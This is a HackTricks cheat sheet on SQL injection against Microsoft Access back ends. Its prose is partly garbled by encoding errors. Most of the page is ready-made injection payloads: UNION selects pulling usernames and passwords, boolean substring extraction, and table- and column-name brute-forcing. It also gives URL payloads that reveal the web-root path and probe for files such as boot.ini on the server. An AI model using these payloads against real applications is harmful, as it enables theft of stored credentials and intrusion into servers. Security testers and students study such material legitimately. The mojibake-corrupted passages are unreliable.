# MS Access SQL Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Online Playground

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## DB Limitations

### String Concatenation

Konkatenacija stringova je moguÄ‡a sa `& (%26)` i `+ (%2b)` karakterima.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### ĞšĞ¾Ğ¼ĞµĞ½Ñ‚Ğ°Ñ€Ğ¸

Ğ£ MS Access-Ñƒ Ğ½ĞµĞ¼Ğ° ĞºĞ¾Ğ¼ĞµĞ½Ñ‚Ğ°Ñ€Ğ°, Ğ°Ğ»Ğ¸ Ğ¾Ñ‡Ğ¸Ğ³Ğ»ĞµĞ´Ğ½Ğ¾ Ñ˜Ğµ Ğ¼Ğ¾Ğ³ÑƒÑ›Ğµ ÑƒĞºĞ»Ğ¾Ğ½Ğ¸Ñ‚Ğ¸ Ğ¿Ğ¾ÑĞ»ĞµĞ´ÑšĞ¸ Ğ´ĞµĞ¾ ÑƒĞ¿Ğ¸Ñ‚Ğ° Ğ¿Ğ¾Ğ¼Ğ¾Ñ›Ñƒ NULL ĞºĞ°Ñ€Ğ°ĞºÑ‚ĞµÑ€Ğ°:
```sql
1' union select 1,2 from table%00
```
Ako ovo ne funkcioniÅ¡e, uvek moÅ¾ete ispraviti sintaksu upita:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Stacked Queries

Nisu podrÅ¾ane.

### LIMIT

Operator **`LIMIT`** **nije implementiran**. MeÄ‘utim, moguÄ‡e je ograniÄiti rezultate SELECT upita na **prvih N redova tabele koristeÄ‡i operator `TOP`**. `TOP` prihvata kao argument ceo broj, koji predstavlja broj redova koji treba da budu vraÄ‡eni.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Just like TOP you can use **`LAST`** which will get the **redove sa kraja**.

## UNION Upiti/Sub upiti

In a SQLi obiÄno Å¾elite na neki naÄin izvrÅ¡iti novi upit da biste izvukli informacije iz drugih tabela. MS Access uvek zahteva da u **subupitima ili dodatnim upitima bude naznaÄen `FROM`**.\
Dakle, ako Å¾elite da izvrÅ¡ite `UNION SELECT` ili `UNION ALL SELECT` ili `SELECT` unutar zagrade u uslovu, uvek **morate naznaÄiti `FROM` sa validnim imenom tabele**.\
Stoga, morate znati **validno ime tabele**.
```sql
-1' UNION SELECT username,password from users%00
```
### Chaining equals + Substring

{% hint style="warning" %}
Ovo Ä‡e vam omoguÄ‡iti da exfiltrirate vrednosti trenutne tabele bez potrebe da znate ime tabele.
{% endhint %}

**MS Access** omoguÄ‡ava **Äudnu sintaksu** kao Å¡to je **`'1'=2='3'='asd'=false`**. Kao Å¡to obiÄno, SQL injekcija Ä‡e biti unutar **`WHERE`** klauzule, moÅ¾emo to zloupotrebiti.

Zamislite da imate SQLi u MS Access bazi podataka i znate (ili ste pogodili) da je jedno **ime kolone username**, i to je polje koje Å¾elite da **exfiltrirate**. Mogli biste proveriti razliÄite odgovore web aplikacije kada se koristi tehnika chaining equals i potencijalno exfiltrirati sadrÅ¾aj sa **boolean injection** koristeÄ‡i **`Mid`** funkciju da dobijete podstringove.
```sql
'=(Mid(username,1,3)='adm')='
```
Ako znate **ime tabele** i **kolone** koju Å¾elite da izvuÄete, moÅ¾ete koristiti kombinaciju izmeÄ‘u `Mid`, `LAST` i `TOP` da **izvuÄete sve informacije** putem boolean SQLi:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel free to check this in the online playground._

### Brute-forcing Tables names

KoriÅ¡Ä‡enjem tehnike povezivanja jednakosti moÅ¾ete takoÄ‘e **bruteforce-ovati imena tabela** sa neÄim poput:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
MoÅ¾ete takoÄ‘e koristiti tradicionalniji naÄin:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Feel free to check this in the online playground._

* Sqlmap uobiÄajeni nazivi tabela: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* Postoji joÅ¡ jedna lista na [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### Brute-Forcing naziva kolona

MoÅ¾ete **brute-force trenutne nazive kolona** koristeÄ‡i trik sa povezivanjem jednakosti sa:
```sql
'=column_name='
```
Ili sa **group by**:
```sql
-1' GROUP BY column_name%00
```
Ili moÅ¾ete koristiti brute-force za imena kolona **druge tabele** sa:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Dumping data

VeÄ‡ smo razgovarali o [**tehnici povezivanja jednakosti**](ms-access-sql-injection.md#chaining-equals-+-substring) **za iskopavanje podataka iz trenutne i drugih tabela**. Ali postoje i drugi naÄini:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
Ukratko, upit koristi "if-then" izjavu kako bi aktivirao "200 OK" u sluÄaju uspeha ili "500 Internal Error" u suprotnom. IskoriÅ¡Ä‡avanjem TOP 10 operatora, moguÄ‡e je izabrati prvih deset rezultata. Naknadna upotreba LAST omoguÄ‡ava da se razmatra samo 10. tuple. Na takvoj vrednosti, koriÅ¡Ä‡enjem MID operatora, moguÄ‡e je izvrÅ¡iti jednostavno poreÄ‘enje karaktera. Pravilnom promenom indeksa MID i TOP, moÅ¾emo izvuÄ‡i sadrÅ¾aj polja "username" za sve redove.

### Time Based

Proverite [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### Other Interesting functions

* `Mid('admin',1,1)` uzmi podstring sa pozicije 1 duÅ¾ine 1 (poÄetna pozicija je 1)
* `LEN('1234')` uzmi duÅ¾inu stringa
* `ASC('A')` uzmi ascii vrednost karaktera
* `CHR(65)` uzmi string iz ascii vrednosti
* `IIF(1=1,'a','b')` if then
* `COUNT(*)` prebroj broj stavki

## Enumerating tables

Sa [**ovde**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) moÅ¾ete videti upit za dobijanje imena tabela:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
MeÄ‘utim, imajte na umu da je veoma tipiÄno pronaÄ‡i SQL injekcije gde **nemate pristup za Äitanje tabele `MSysObjects`**.

## Pristup fajl sistemu

### Potpuna putanja do web root direktorijuma

Znanje o **apsolutnoj putanji web root-a moÅ¾e olakÅ¡ati dalja napada**. Ako greÅ¡ke aplikacije nisu potpuno sakrivene, putanja direktorijuma moÅ¾e biti otkrivena pokuÅ¡ajem selektovanja podataka iz nepostojeÄ‡e baze podataka.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access odgovara sa **porukom o greÅ¡ci koja sadrÅ¾i punu putanju web direktorijuma**.

### Enumeracija fajlova

SledeÄ‡i napadni vektor moÅ¾e se koristiti za **inferisanje postojanja fajla na udaljenom fajl sistemu**. Ako navedeni fajl postoji, MS Access aktivira poruku o greÅ¡ci koja obaveÅ¡tava da je format baze podataka nevaÅ¾eÄ‡i:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

Drugi naÄin za enumeraciju fajlova sastoji se u **navoÄ‘enju stavke database.table**. **Ako** navedeni **fajl postoji**, MS Access prikazuje **poruku o greÅ¡ci u formatu baze podataka**.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### PogaÄ‘anje imena .mdb fajla

**Ime fajla baze podataka (.mdb)** moÅ¾e se inferirati sledeÄ‡im upitom:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Gde je **name\[i] ime .mdb fajla** i **realTable je postojeÄ‡a tabela** unutar baze podataka. Iako Ä‡e MS Access uvek aktivirati poruku o greÅ¡ci, moguÄ‡e je razlikovati izmeÄ‘u nevaÅ¾eÄ‡eg imena fajla i vaÅ¾eÄ‡eg .mdb imena fajla.

### .mdb alat za otkljuÄavanje lozinki

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) je besplatna alatka koja se moÅ¾e koristiti za oporavak glavne lozinke baze podataka Microsoft Access 95/97/2000/XP ili Jet Database Engine 3.0/4.0.

## Reference

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
